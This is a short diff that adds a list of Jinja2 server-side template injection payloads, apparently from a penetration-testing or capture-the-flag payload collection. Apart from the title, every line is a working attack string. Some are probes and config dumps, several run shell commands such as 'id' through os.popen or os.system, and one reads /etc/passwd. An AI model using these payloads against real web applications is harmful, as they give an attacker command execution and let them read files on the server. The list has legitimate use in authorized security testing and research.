@@ -1,0 +1,11 @@
+# SSTI - Jinja2 Payloads
+{{7*7}}
+{{config}}
+{{self.__dict__}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{lipsum.__globals__.os.popen('id').read()}}
+{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='catch_warnings'%}{{c.__init__.__globals__['__builtins__'].eval("__import__('os').system('id')")}}{% endif %}{%endfor%}
+{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
+{{7*'7'}}
